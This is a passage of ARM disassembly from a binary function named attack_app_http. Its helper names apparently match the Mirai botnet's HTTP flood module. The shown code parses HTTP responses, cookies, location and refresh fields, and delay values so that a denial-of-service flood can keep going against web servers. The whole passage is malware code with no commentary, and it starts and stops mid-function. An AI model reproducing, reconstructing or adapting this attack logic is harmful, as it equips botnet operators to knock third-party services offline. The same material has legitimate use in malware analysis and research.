    9158:	e51f2158 	ldr	r2, [pc, #-344]	; 9008 <attack_app_http+0xe38>
    915c:	e3a03002 	mov	r3, #2
    9160:	eb002e9e 	bl	14be0 <util_memsearch>
    9164:	e3700001 	cmn	r0, #1
    9168:	0a000013 	beq	91bc <attack_app_http+0xfec>
    916c:	e3500001 	cmp	r0, #1
    9170:	e28d2c51 	add	r2, sp, #20736	; 0x5100
    9174:	c2400002 	subgt	r0, r0, #2
    9178:	e2822070 	add	r2, r2, #112	; 0x70
    917c:	e0823000 	add	r3, r2, r0
    9180:	e0833004 	add	r3, r3, r4
    9184:	e7c35007 	strb	r5, [r3, r7]
    9188:	e1a00006 	mov	r0, r6
    918c:	eb002e65 	bl	14b28 <util_strlen>
    9190:	e1a01005 	mov	r1, r5
    9194:	e1a04000 	mov	r4, r0
    9198:	e3a00044 	mov	r0, #68	; 0x44
    919c:	eb0028ae 	bl	1345c <table_retrieve_val>
    91a0:	e1a01004 	mov	r1, r4
    91a4:	e1a02000 	mov	r2, r0
    91a8:	e1a00006 	mov	r0, r6
    91ac:	eb002f30 	bl	14e74 <util_stristr>
    91b0:	e3500000 	cmp	r0, #0
    91b4:	13a03001 	movne	r3, #1
    91b8:	158a3004 	strne	r3, [sl, #4]
    91bc:	e3a07000 	mov	r7, #0
    91c0:	e1a01007 	mov	r1, r7
    91c4:	e3a00042 	mov	r0, #66	; 0x42
    91c8:	e58a7008 	str	r7, [sl, #8]
    91cc:	eb0028a2 	bl	1345c <table_retrieve_val>
    91d0:	e1a0100b 	mov	r1, fp
    91d4:	e1a02000 	mov	r2, r0
    91d8:	e59d0014 	ldr	r0, [sp, #20]
    91dc:	eb002f24 	bl	14e74 <util_stristr>
    91e0:	e3e06c51 	mvn	r6, #20736	; 0x5100
    91e4:	e3700001 	cmn	r0, #1
    91e8:	e2466024 	sub	r6, r6, #36	; 0x24
    91ec:	0a000028 	beq	9294 <attack_app_http+0x10c4>
    91f0:	e1a01007 	mov	r1, r7
    91f4:	e3a00042 	mov	r0, #66	; 0x42
    91f8:	eb002897 	bl	1345c <table_retrieve_val>
    91fc:	e1a0100b 	mov	r1, fp
    9200:	e1a02000 	mov	r2, r0
    9204:	e59d0014 	ldr	r0, [sp, #20]
    9208:	eb002f19 	bl	14e74 <util_stristr>
    920c:	e59dc014 	ldr	ip, [sp, #20]
    9210:	e7dc3000 	ldrb	r3, [ip, r0]
    9214:	e59de014 	ldr	lr, [sp, #20]
    9218:	e3530020 	cmp	r3, #32
    921c:	e1a04000 	mov	r4, r0
    9220:	02804001 	addeq	r4, r0, #1
    9224:	e08e5004 	add	r5, lr, r4
    9228:	e1a00005 	mov	r0, r5
    922c:	e064100b 	rsb	r1, r4, fp
    9230:	e51f2230 	ldr	r2, [pc, #-560]	; 9008 <attack_app_http+0xe38>
    9234:	e3a03002 	mov	r3, #2
    9238:	eb002e68 	bl	14be0 <util_memsearch>
    923c:	e3700001 	cmn	r0, #1
    9240:	0a000013 	beq	9294 <attack_app_http+0x10c4>
    9244:	e3500001 	cmp	r0, #1
    9248:	e28d1c51 	add	r1, sp, #20736	; 0x5100
    924c:	c2400002 	subgt	r0, r0, #2
    9250:	e2811070 	add	r1, r1, #112	; 0x70
    9254:	e0813000 	add	r3, r1, r0
    9258:	e0833004 	add	r3, r3, r4
    925c:	e7c37006 	strb	r7, [r3, r6]
    9260:	e1a00005 	mov	r0, r5
    9264:	eb002e2f 	bl	14b28 <util_strlen>
    9268:	e1a01007 	mov	r1, r7
    926c:	e1a04000 	mov	r4, r0
    9270:	e3a00043 	mov	r0, #67	; 0x43
    9274:	eb002878 	bl	1345c <table_retrieve_val>
    9278:	e1a01004 	mov	r1, r4
    927c:	e1a02000 	mov	r2, r0
    9280:	e1a00005 	mov	r0, r5
    9284:	eb002efa 	bl	14e74 <util_stristr>
    9288:	e3500000 	cmp	r0, #0
    928c:	13a03001 	movne	r3, #1
    9290:	158a3008 	strne	r3, [sl, #8]
    9294:	e3a01000 	mov	r1, #0
    9298:	e3a00041 	mov	r0, #65	; 0x41
    929c:	eb00286e 	bl	1345c <table_retrieve_val>
    92a0:	e1a0100b 	mov	r1, fp
    92a4:	e1a02000 	mov	r2, r0
    92a8:	e59d0014 	ldr	r0, [sp, #20]
    92ac:	eb002ef0 	bl	14e74 <util_stristr>
    92b0:	e3700001 	cmn	r0, #1
    92b4:	e3e06c51 	mvn	r6, #20736	; 0x5100
    92b8:	03a03000 	moveq	r3, #0
    92bc:	e2466024 	sub	r6, r6, #36	; 0x24
    92c0:	058a300c 	streq	r3, [sl, #12]
    92c4:	0a000020 	beq	934c <attack_app_http+0x117c>
    92c8:	e3a01000 	mov	r1, #0
    92cc:	e3a00041 	mov	r0, #65	; 0x41
    92d0:	eb002861 	bl	1345c <table_retrieve_val>
    92d4:	e1a0100b 	mov	r1, fp
    92d8:	e1a02000 	mov	r2, r0
    92dc:	e59d0014 	ldr	r0, [sp, #20]
    92e0:	eb002ee3 	bl	14e74 <util_stristr>
    92e4:	e59d2014 	ldr	r2, [sp, #20]
    92e8:	e7d23000 	ldrb	r3, [r2, r0]
    92ec:	e3530020 	cmp	r3, #32
    92f0:	e59d3014 	ldr	r3, [sp, #20]
    92f4:	e1a04000 	mov	r4, r0
    92f8:	02804001 	addeq	r4, r0, #1
    92fc:	e0835004 	add	r5, r3, r4
    9300:	e1a00005 	mov	r0, r5
    9304:	e064100b 	rsb	r1, r4, fp
    9308:	e51f2308 	ldr	r2, [pc, #-776]	; 9008 <attack_app_http+0xe38>
    930c:	e3a03002 	mov	r3, #2
    9310:	eb002e32 	bl	14be0 <util_memsearch>
    9314:	e3700001 	cmn	r0, #1
    9318:	0a00000b 	beq	934c <attack_app_http+0x117c>
    931c:	e3500001 	cmp	r0, #1
    9320:	e28dcc51 	add	ip, sp, #20736	; 0x5100
    9324:	c2400002 	subgt	r0, r0, #2
    9328:	e28cc070 	add	ip, ip, #112	; 0x70
    932c:	e08c2000 	add	r2, ip, r0
    9330:	e0822004 	add	r2, r2, r4
    9334:	e3a03000 	mov	r3, #0
    9338:	e1a00005 	mov	r0, r5
    933c:	e3a0100a 	mov	r1, #10
    9340:	e7c23006 	strb	r3, [r2, r6]
    9344:	eb002e40 	bl	14c4c <util_atoi>
    9348:	e58a000c 	str	r0, [sl, #12]
    934c:	e3a05000 	mov	r5, #0
    9350:	e59d3014 	ldr	r3, [sp, #20]
    9354:	e3a01000 	mov	r1, #0
    9358:	e3a00040 	mov	r0, #64	; 0x40
    935c:	e0834005 	add	r4, r3, r5
    9360:	eb00283d 	bl	1345c <table_retrieve_val>
    9364:	e1a0100b 	mov	r1, fp
    9368:	e1a02000 	mov	r2, r0
    936c:	e1a00004 	mov	r0, r4
    9370:	eb002ebf 	bl	14e74 <util_stristr>
    9374:	e3e0cc51 	mvn	ip, #20736	; 0x5100
    9378:	e24cc024 	sub	ip, ip, #36	; 0x24
    937c:	e3700001 	cmn	r0, #1
    9380:	e58dc020 	str	ip, [sp, #32]
    9384:	0a00007f 	beq	9588 <attack_app_http+0x13b8>
    9388:	e59a3010 	ldr	r3, [sl, #16]
    938c:	e3530004 	cmp	r3, #4
    9390:	ca00007c 	bgt	9588 <attack_app_http+0x13b8>
    9394:	e3a01000 	mov	r1, #0
    9398:	e3a00040 	mov	r0, #64	; 0x40
    939c:	eb00282e 	bl	1345c <table_retrieve_val>
    93a0:	e1a0100b 	mov	r1, fp
    93a4:	e1a02000 	mov	r2, r0
    93a8:	e1a00004 	mov	r0, r4
    93ac:	eb002eb0 	bl	14e74 <util_stristr>
    93b0:	e59de014 	ldr	lr, [sp, #20]
    93b4:	e0808005 	add	r8, r0, r5
    93b8:	e7de3008 	ldrb	r3, [lr, r8]
    93bc:	e3530020 	cmp	r3, #32
    93c0:	02800001 	addeq	r0, r0, #1
    93c4:	e065300b 	rsb	r3, r5, fp
    93c8:	e0607003 	rsb	r7, r0, r3
    93cc:	e0846000 	add	r6, r4, r0
    93d0:	00808005 	addeq	r8, r0, r5
    93d4:	e1a01007 	mov	r1, r7
    93d8:	e1a00006 	mov	r0, r6
    93dc:	e51f23dc 	ldr	r2, [pc, #-988]	; 9008 <attack_app_http+0xe38>
    93e0:	e3a03002 	mov	r3, #2
    93e4:	eb002dfd 	bl	14be0 <util_memsearch>
    93e8:	e3700001 	cmn	r0, #1
    93ec:	e1a04000 	mov	r4, r0
    93f0:	0a000029 	beq	949c <attack_app_http+0x12cc>
    93f4:	e59d1014 	ldr	r1, [sp, #20]
    93f8:	e3500001 	cmp	r0, #1
    93fc:	c2404002 	subgt	r4, r0, #2
    9400:	e0815008 	add	r5, r1, r8
    9404:	e1a00006 	mov	r0, r6
    9408:	e1a01007 	mov	r1, r7
    940c:	e51f2410 	ldr	r2, [pc, #-1040]	; 9004 <attack_app_http+0xe34>
    9410:	e3a03001 	mov	r3, #1
    9414:	eb002df1 	bl	14be0 <util_memsearch>
    9418:	e3500000 	cmp	r0, #0
    941c:	da000005 	ble	9438 <attack_app_http+0x1268>
    9420:	e1a00006 	mov	r0, r6
    9424:	e1a01007 	mov	r1, r7
    9428:	e51f242c 	ldr	r2, [pc, #-1068]	; 9004 <attack_app_http+0xe34>
    942c:	e3a03001 	mov	r3, #1
    9430:	eb002dea 	bl	14be0 <util_memsearch>
    9434:	e2404001 	sub	r4, r0, #1
    9438:	e28d2c51 	add	r2, sp, #20736	; 0x5100
    943c:	e2822070 	add	r2, r2, #112	; 0x70
    9440:	e0823004 	add	r3, r2, r4
    9444:	e59de020 	ldr	lr, [sp, #32]
    9448:	e3a02000 	mov	r2, #0
    944c:	e0833008 	add	r3, r3, r8
    9450:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    9454:	e7c3200e 	strb	r2, [r3, lr]
    9458:	e581216c 	str	r2, [r1, #364]	; 0x16c
    945c:	ea000004 	b	9474 <attack_app_http+0x12a4>
    9460:	e7d53004 	ldrb	r3, [r5, r4]
    9464:	e353003d 	cmp	r3, #61	; 0x3d
    9468:	0a00000d 	beq	94a4 <attack_app_http+0x12d4>
    946c:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9470:	e582c16c 	str	ip, [r2, #364]	; 0x16c
    9474:	e1a00005 	mov	r0, r5
    9478:	eb002daa 	bl	14b28 <util_strlen>
    947c:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9480:	e593416c 	ldr	r4, [r3, #364]	; 0x16c
    9484:	e1500004 	cmp	r0, r4
    9488:	e284c001 	add	ip, r4, #1
    948c:	cafffff3 	bgt	9460 <attack_app_http+0x1290>
    9490:	e7d53004 	ldrb	r3, [r5, r4]
    9494:	e353003d 	cmp	r3, #61	; 0x3d
    9498:	0a000001 	beq	94a4 <attack_app_http+0x12d4>
    949c:	e1a05008 	mov	r5, r8
    94a0:	eaffffaa 	b	9350 <attack_app_http+0x1180>
    94a4:	e59a3010 	ldr	r3, [sl, #16]
    94a8:	e3a0c000 	mov	ip, #0
    94ac:	e28dea05 	add	lr, sp, #20480	; 0x5000
    94b0:	e3530000 	cmp	r3, #0
    94b4:	e58ec16c 	str	ip, [lr, #364]	; 0x16c
    94b8:	da000013 	ble	950c <attack_app_http+0x133c>
    94bc:	e1a0100c 	mov	r1, ip
    94c0:	ea000008 	b	94e8 <attack_app_http+0x1318>
    94c4:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    94c8:	e591316c 	ldr	r3, [r1, #364]	; 0x16c
    94cc:	e59a2010 	ldr	r2, [sl, #16]
    94d0:	e283c001 	add	ip, r3, #1
    94d4:	e152000c 	cmp	r2, ip
    94d8:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    94dc:	e1a0100c 	mov	r1, ip
    94e0:	e582c16c 	str	ip, [r2, #364]	; 0x16c
    94e4:	da000008 	ble	950c <attack_app_http+0x133c>
    94e8:	e1a01381 	lsl	r1, r1, #7
    94ec:	e2811d17 	add	r1, r1, #1472	; 0x5c0
    94f0:	e0891001 	add	r1, r9, r1
    94f4:	e1a00005 	mov	r0, r5
    94f8:	e1a02004 	mov	r2, r4
    94fc:	eb002ea0 	bl	14f84 <util_strncmp>
    9500:	e3500000 	cmp	r0, #0
    9504:	0affffee 	beq	94c4 <attack_app_http+0x12f4>
    9508:	eaffffe3 	b	949c <attack_app_http+0x12cc>
    950c:	e1a00005 	mov	r0, r5
    9510:	eb002d84 	bl	14b28 <util_strlen>
    9514:	e350007f 	cmp	r0, #127	; 0x7f
    9518:	caffffdf 	bgt	949c <attack_app_http+0x12cc>
    951c:	e59a0010 	ldr	r0, [sl, #16]
    9520:	e1a00380 	lsl	r0, r0, #7
    9524:	e2800d17 	add	r0, r0, #1472	; 0x5c0
    9528:	e1a01005 	mov	r1, r5
    952c:	e0890000 	add	r0, r9, r0
    9530:	eb002d86 	bl	14b50 <util_strcpy>
    9534:	e59a3010 	ldr	r3, [sl, #16]
    9538:	e1a05008 	mov	r5, r8
    953c:	e2833001 	add	r3, r3, #1
    9540:	e58a3010 	str	r3, [sl, #16]
    9544:	eaffff81 	b	9350 <attack_app_http+0x1180>
    9548:	e3a03068 	mov	r3, #104	; 0x68
    954c:	e5843000 	str	r3, [r4]
    9550:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    9554:	eb004239 	bl	19e40 <__GI___libc_close>
    9558:	e3e03000 	mvn	r3, #0
    955c:	e3a02000 	mov	r2, #0
    9560:	e50a35ac 	str	r3, [sl, #-1452]	; 0xfffffa54
    9564:	e54a25a8 	strb	r2, [sl, #-1448]	; 0xfffffa58
    9568:	eafffc9f 	b	87ec <attack_app_http+0x61c>
    956c:	e243300b 	sub	r3, r3, #11
    9570:	e54635a8 	strb	r3, [r6, #-1448]	; 0xfffffa58
    9574:	e51605ac 	ldr	r0, [r6, #-1452]	; 0xfffffa54
    9578:	eb004230 	bl	19e40 <__GI___libc_close>
    957c:	e3e03000 	mvn	r3, #0
    9580:	e50635ac 	str	r3, [r6, #-1452]	; 0xfffffa54
    9584:	eafffc1a 	b	85f4 <attack_app_http+0x424>
    9588:	e3a01000 	mov	r1, #0
    958c:	e3a0003f 	mov	r0, #63	; 0x3f
    9590:	eb0027b1 	bl	1345c <table_retrieve_val>
    9594:	e1a0100b 	mov	r1, fp
    9598:	e1a02000 	mov	r2, r0
    959c:	e59d0014 	ldr	r0, [sp, #20]
    95a0:	eb002e33 	bl	14e74 <util_stristr>
    95a4:	e3700001 	cmn	r0, #1
    95a8:	0a00005a 	beq	9718 <attack_app_http+0x1548>
    95ac:	e3a01000 	mov	r1, #0
    95b0:	e3a0003f 	mov	r0, #63	; 0x3f
    95b4:	eb0027a8 	bl	1345c <table_retrieve_val>
    95b8:	e1a0100b 	mov	r1, fp
    95bc:	e1a02000 	mov	r2, r0
    95c0:	e59d0014 	ldr	r0, [sp, #20]
    95c4:	eb002e2a 	bl	14e74 <util_stristr>
    95c8:	e59de014 	ldr	lr, [sp, #20]
    95cc:	e7de3000 	ldrb	r3, [lr, r0]
    95d0:	e59d1014 	ldr	r1, [sp, #20]
    95d4:	e3530020 	cmp	r3, #32
    95d8:	e1a04000 	mov	r4, r0
    95dc:	02804001 	addeq	r4, r0, #1
    95e0:	e0816004 	add	r6, r1, r4
    95e4:	e1a00006 	mov	r0, r6
    95e8:	e064100b 	rsb	r1, r4, fp
    95ec:	e51f25ec 	ldr	r2, [pc, #-1516]	; 9008 <attack_app_http+0xe38>
    95f0:	e3a03002 	mov	r3, #2
    95f4:	eb002d79 	bl	14be0 <util_memsearch>
    95f8:	e3700001 	cmn	r0, #1
    95fc:	0a000045 	beq	9718 <attack_app_http+0x1548>
    9600:	e3500001 	cmp	r0, #1
    9604:	e28d2c51 	add	r2, sp, #20736	; 0x5100
    9608:	c2400002 	subgt	r0, r0, #2
    960c:	e2822070 	add	r2, r2, #112	; 0x70
    9610:	e082c000 	add	ip, r2, r0
    9614:	e59de020 	ldr	lr, [sp, #32]
    9618:	e2805001 	add	r5, r0, #1
    961c:	e08cc004 	add	ip, ip, r4
    9620:	e3a07000 	mov	r7, #0
    9624:	e1a00006 	mov	r0, r6
    9628:	e1a01005 	mov	r1, r5
    962c:	e51f2624 	ldr	r2, [pc, #-1572]	; 9010 <attack_app_http+0xe40>
    9630:	e3a03004 	mov	r3, #4
    9634:	e7cc700e 	strb	r7, [ip, lr]
    9638:	eb002d68 	bl	14be0 <util_memsearch>
    963c:	e3500004 	cmp	r0, #4
    9640:	0a0000ee 	beq	9a00 <attack_app_http+0x1830>
    9644:	e59d1014 	ldr	r1, [sp, #20]
    9648:	e7d13004 	ldrb	r3, [r1, r4]
    964c:	e353002f 	cmp	r3, #47	; 0x2f
    9650:	0a00016a 	beq	9c00 <attack_app_http+0x1a30>
    9654:	e3a03001 	mov	r3, #1
    9658:	e54a35a8 	strb	r3, [sl, #-1448]	; 0xfffffa58
    965c:	eafffc62 	b	87ec <attack_app_http+0x61c>
    9660:	eb00347c 	bl	16858 <__GI___errno_location>
    9664:	e1a04000 	mov	r4, r0
    9668:	e3a03000 	mov	r3, #0
    966c:	e5843000 	str	r3, [r4]
    9670:	e59d1014 	ldr	r1, [sp, #20]
    9674:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    9678:	e3a02b0a 	mov	r2, #10240	; 0x2800
    967c:	e2833901 	add	r3, r3, #16384	; 0x4000
    9680:	eb0035af 	bl	16d44 <__libc_recv>
    9684:	e3500000 	cmp	r0, #0
    9688:	0affffae 	beq	9548 <attack_app_http+0x1378>
    968c:	e3700001 	cmn	r0, #1
    9690:	1afffff4 	bne	9668 <attack_app_http+0x1498>
    9694:	e5943000 	ldr	r3, [r4]
    9698:	e353000b 	cmp	r3, #11
    969c:	1affffab 	bne	9550 <attack_app_http+0x1380>
    96a0:	e55a35a8 	ldrb	r3, [sl, #-1448]	; 0xfffffa58
    96a4:	e3530000 	cmp	r3, #0
    96a8:	0afffc4f 	beq	87ec <attack_app_http+0x61c>
    96ac:	eaffffe8 	b	9654 <attack_app_http+0x1484>
    96b0:	e2833001 	add	r3, r3, #1
    96b4:	e54a35a8 	strb	r3, [sl, #-1448]	; 0xfffffa58
    96b8:	eafffc4b 	b	87ec <attack_app_http+0x61c>
    96bc:	e1a0000b 	mov	r0, fp
    96c0:	e1a01004 	mov	r1, r4
    96c4:	eb002d21 	bl	14b50 <util_strcpy>
    96c8:	eafffd6d 	b	8c84 <attack_app_http+0xab4>
    96cc:	e3a03068 	mov	r3, #104	; 0x68
    96d0:	e58b3000 	str	r3, [fp]
    96d4:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    96d8:	eb0041d8 	bl	19e40 <__GI___libc_close>
    96dc:	e3e03000 	mvn	r3, #0
    96e0:	e3a02000 	mov	r2, #0
    96e4:	e50a35ac 	str	r3, [sl, #-1452]	; 0xfffffa54
    96e8:	e54a25a8 	strb	r2, [sl, #-1448]	; 0xfffffa58
    96ec:	eafffc3e 	b	87ec <attack_app_http+0x61c>
    96f0:	e59b3000 	ldr	r3, [fp]
    96f4:	e353000b 	cmp	r3, #11
    96f8:	0afffc3b 	beq	87ec <attack_app_http+0x61c>
    96fc:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    9700:	eb0041ce 	bl	19e40 <__GI___libc_close>
    9704:	e3e03000 	mvn	r3, #0
    9708:	e3a02000 	mov	r2, #0
    970c:	e50a35ac 	str	r3, [sl, #-1452]	; 0xfffffa54
    9710:	e54a25a8 	strb	r2, [sl, #-1448]	; 0xfffffa58
    9714:	eafffc34 	b	87ec <attack_app_http+0x61c>
    9718:	e3a01000 	mov	r1, #0
    971c:	e3a0003e 	mov	r0, #62	; 0x3e
    9720:	eb00274d 	bl	1345c <table_retrieve_val>
    9724:	e1a0100b 	mov	r1, fp
    9728:	e1a02000 	mov	r2, r0
    972c:	e59d0014 	ldr	r0, [sp, #20]
    9730:	eb002dcf 	bl	14e74 <util_stristr>
    9734:	e3e06c51 	mvn	r6, #20736	; 0x5100
    9738:	e3700001 	cmn	r0, #1
    973c:	e2466024 	sub	r6, r6, #36	; 0x24
    9740:	0a00007c 	beq	9938 <attack_app_http+0x1768>
    9744:	e3a01000 	mov	r1, #0
    9748:	e3a0003e 	mov	r0, #62	; 0x3e
    974c:	eb002742 	bl	1345c <table_retrieve_val>
    9750:	e1a0100b 	mov	r1, fp
    9754:	e1a02000 	mov	r2, r0
    9758:	e59d0014 	ldr	r0, [sp, #20]
    975c:	eb002dc4 	bl	14e74 <util_stristr>
    9760:	e59de014 	ldr	lr, [sp, #20]
    9764:	e7de3000 	ldrb	r3, [lr, r0]
    9768:	e59d1014 	ldr	r1, [sp, #20]
    976c:	e3530020 	cmp	r3, #32
    9770:	e1a04000 	mov	r4, r0
    9774:	02804001 	addeq	r4, r0, #1
    9778:	e0815004 	add	r5, r1, r4
    977c:	e1a00005 	mov	r0, r5
    9780:	e064100b 	rsb	r1, r4, fp
    9784:	e51f2784 	ldr	r2, [pc, #-1924]	; 9008 <attack_app_http+0xe38>
    9788:	e3a03002 	mov	r3, #2
    978c:	eb002d13 	bl	14be0 <util_memsearch>
    9790:	e3700001 	cmn	r0, #1
    9794:	e1a07000 	mov	r7, r0
    9798:	0a000066 	beq	9938 <attack_app_http+0x1768>
    979c:	e3500001 	cmp	r0, #1
    97a0:	e28dcc51 	add	ip, sp, #20736	; 0x5100
    97a4:	c2407002 	subgt	r7, r0, #2
    97a8:	e28cc070 	add	ip, ip, #112	; 0x70
    97ac:	e08c2007 	add	r2, ip, r7
    97b0:	e3a03000 	mov	r3, #0
    97b4:	e0822004 	add	r2, r2, r4
    97b8:	e7c23006 	strb	r3, [r2, r6]
    97bc:	e28dea05 	add	lr, sp, #20480	; 0x5000
    97c0:	e58e316c 	str	r3, [lr, #364]	; 0x16c
    97c4:	e59d1014 	ldr	r1, [sp, #20]
    97c8:	e7d10004 	ldrb	r0, [r1, r4]
    97cc:	e2403030 	sub	r3, r0, #48	; 0x30
    97d0:	e3530009 	cmp	r3, #9
    97d4:	81a01005 	movhi	r1, r5
    97d8:	8a000009 	bhi	9804 <attack_app_http+0x1634>
    97dc:	e3a0e001 	mov	lr, #1
    97e0:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    97e4:	e582e16c 	str	lr, [r2, #364]	; 0x16c
    97e8:	e7de0005 	ldrb	r0, [lr, r5]
    97ec:	e2403030 	sub	r3, r0, #48	; 0x30
    97f0:	e1a0c00e 	mov	ip, lr
    97f4:	e3530009 	cmp	r3, #9
    97f8:	e28ee001 	add	lr, lr, #1
    97fc:	e08c1005 	add	r1, ip, r5
    9800:	9afffff6 	bls	97e0 <attack_app_http+0x1610>
    9804:	e3500000 	cmp	r0, #0
    9808:	0a00004a 	beq	9938 <attack_app_http+0x1768>
    980c:	e3a06000 	mov	r6, #0
    9810:	e5c16000 	strb	r6, [r1]
    9814:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9818:	e593c16c 	ldr	ip, [r3, #364]	; 0x16c
    981c:	e28cc001 	add	ip, ip, #1
    9820:	e583c16c 	str	ip, [r3, #364]	; 0x16c
    9824:	e7d5300c 	ldrb	r3, [r5, ip]
    9828:	e3530020 	cmp	r3, #32
    982c:	028cc001 	addeq	ip, ip, #1
    9830:	e085400c 	add	r4, r5, ip
    9834:	028dea05 	addeq	lr, sp, #20480	; 0x5000
    9838:	058ec16c 	streq	ip, [lr, #364]	; 0x16c
    983c:	e1a00004 	mov	r0, r4
    9840:	eb002cb8 	bl	14b28 <util_strlen>
    9844:	e51f2840 	ldr	r2, [pc, #-2112]	; 900c <attack_app_http+0xe3c>
    9848:	e1a01000 	mov	r1, r0
    984c:	e1a00004 	mov	r0, r4
    9850:	eb002d87 	bl	14e74 <util_stristr>
    9854:	e3700001 	cmn	r0, #1
    9858:	028d3a05 	addeq	r3, sp, #20480	; 0x5000
    985c:	0593c16c 	ldreq	ip, [r3, #364]	; 0x16c
    9860:	0a00000c 	beq	9898 <attack_app_http+0x16c8>
    9864:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    9868:	e591416c 	ldr	r4, [r1, #364]	; 0x16c
    986c:	e0854004 	add	r4, r5, r4
    9870:	e1a00004 	mov	r0, r4
    9874:	eb002cab 	bl	14b28 <util_strlen>
    9878:	e51f2874 	ldr	r2, [pc, #-2164]	; 900c <attack_app_http+0xe3c>
    987c:	e1a01000 	mov	r1, r0
    9880:	e1a00004 	mov	r0, r4
    9884:	eb002d7a 	bl	14e74 <util_stristr>
    9888:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    988c:	e592c16c 	ldr	ip, [r2, #364]	; 0x16c
    9890:	e08cc000 	add	ip, ip, r0
    9894:	e582c16c 	str	ip, [r2, #364]	; 0x16c
    9898:	e7d5300c 	ldrb	r3, [r5, ip]
    989c:	e3530022 	cmp	r3, #34	; 0x22
    98a0:	0a000133 	beq	9d74 <attack_app_http+0x1ba4>
    98a4:	e1a00005 	mov	r0, r5
    98a8:	e3a0100a 	mov	r1, #10
    98ac:	eb002ce6 	bl	14c4c <util_atoi>
    98b0:	e2403001 	sub	r3, r0, #1
    98b4:	e3530008 	cmp	r3, #8
    98b8:	959d2038 	ldrls	r2, [sp, #56]	; 0x38
    98bc:	90804002 	addls	r4, r0, r2
    98c0:	9a000001 	bls	98cc <attack_app_http+0x16fc>
    98c4:	ea000005 	b	98e0 <attack_app_http+0x1710>
    98c8:	eb004107 	bl	19cec <__GI_sleep>
    98cc:	e3a00000 	mov	r0, #0
    98d0:	eb0032c5 	bl	163ec <__GI_time>
    98d4:	e1540000 	cmp	r4, r0
    98d8:	e3a00001 	mov	r0, #1
    98dc:	8afffff9 	bhi	98c8 <attack_app_http+0x16f8>
    98e0:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    98e4:	e593416c 	ldr	r4, [r3, #364]	; 0x16c
    98e8:	e0856004 	add	r6, r5, r4
    98ec:	e1a00006 	mov	r0, r6
    98f0:	eb002c8c 	bl	14b28 <util_strlen>
    98f4:	e51f28ec 	ldr	r2, [pc, #-2284]	; 9010 <attack_app_http+0xe40>
    98f8:	e1a01000 	mov	r1, r0
    98fc:	e1a00006 	mov	r0, r6
    9900:	eb002d5b 	bl	14e74 <util_stristr>
    9904:	e3500004 	cmp	r0, #4
    9908:	0a0000d4 	beq	9c60 <attack_app_http+0x1a90>
    990c:	e7d53004 	ldrb	r3, [r5, r4]
    9910:	e353002f 	cmp	r3, #47	; 0x2f
    9914:	0a000128 	beq	9dbc <attack_app_http+0x1bec>
    9918:	e2890e59 	add	r0, r9, #1424	; 0x590
    991c:	e2800007 	add	r0, r0, #7
    9920:	e51f190c 	ldr	r1, [pc, #-2316]	; 901c <attack_app_http+0xe4c>
    9924:	e3a02004 	mov	r2, #4
    9928:	eb0033e0 	bl	168b0 <__GI_memcpy>
    992c:	e3a0300a 	mov	r3, #10
    9930:	e54a35a8 	strb	r3, [sl, #-1448]	; 0xfffffa58
    9934:	eafffbac 	b	87ec <attack_app_http+0x61c>
    9938:	e1a0100b 	mov	r1, fp
    993c:	e51f2930 	ldr	r2, [pc, #-2352]	; 9014 <attack_app_http+0xe44>
    9940:	e3a03004 	mov	r3, #4
    9944:	e59d0014 	ldr	r0, [sp, #20]
    9948:	eb002ca4 	bl	14be0 <util_memsearch>
    994c:	e2894e59 	add	r4, r9, #1424	; 0x590
    9950:	e2844007 	add	r4, r4, #7
    9954:	e1a05000 	mov	r5, r0
    9958:	e51f1948 	ldr	r1, [pc, #-2376]	; 9018 <attack_app_http+0xe48>
    995c:	e1a00004 	mov	r0, r4
    9960:	eb002d67 	bl	14f04 <util_strcmp>
    9964:	e3500000 	cmp	r0, #0
    9968:	0a000069 	beq	9b14 <attack_app_http+0x1944>
    996c:	e3a03007 	mov	r3, #7
    9970:	e54a35a8 	strb	r3, [sl, #-1448]	; 0xfffffa58
    9974:	e1a02005 	mov	r2, r5
    9978:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    997c:	e59d1014 	ldr	r1, [sp, #20]
    9980:	e3a03901 	mov	r3, #16384	; 0x4000
    9984:	eb0034ee 	bl	16d44 <__libc_recv>
    9988:	eafffb97 	b	87ec <attack_app_http+0x61c>
    998c:	e3a01000 	mov	r1, #0
    9990:	e3a0003d 	mov	r0, #61	; 0x3d
    9994:	e59a4294 	ldr	r4, [sl, #660]	; 0x294
    9998:	eb0026af 	bl	1345c <table_retrieve_val>
    999c:	e1a01004 	mov	r1, r4
    99a0:	e1a02000 	mov	r2, r0
    99a4:	e3a0300b 	mov	r3, #11
    99a8:	e1a00007 	mov	r0, r7
    99ac:	eb002c8b 	bl	14be0 <util_memsearch>
    99b0:	e59a1294 	ldr	r1, [sl, #660]	; 0x294
    99b4:	e0876000 	add	r6, r7, r0
    99b8:	e1a04000 	mov	r4, r0
    99bc:	e0601001 	rsb	r1, r0, r1
    99c0:	e51f29a4 	ldr	r2, [pc, #-2468]	; 9024 <attack_app_http+0xe54>
    99c4:	e1a03008 	mov	r3, r8
    99c8:	e1a00006 	mov	r0, r6
    99cc:	eb002c83 	bl	14be0 <util_memsearch>
    99d0:	e59a3010 	ldr	r3, [sl, #16]
    99d4:	e0805004 	add	r5, r0, r4
    99d8:	e0892005 	add	r2, r9, r5
    99dc:	e3a0b000 	mov	fp, #0
    99e0:	e3530004 	cmp	r3, #4
    99e4:	e5c2b843 	strb	fp, [r2, #2115]	; 0x843
    99e8:	da000059 	ble	9b54 <attack_app_http+0x1984>
    99ec:	e3e03000 	mvn	r3, #0
    99f0:	e3a0200a 	mov	r2, #10
    99f4:	e58a300c 	str	r3, [sl, #12]
    99f8:	e54a25a8 	strb	r2, [sl, #-1448]	; 0xfffffa58
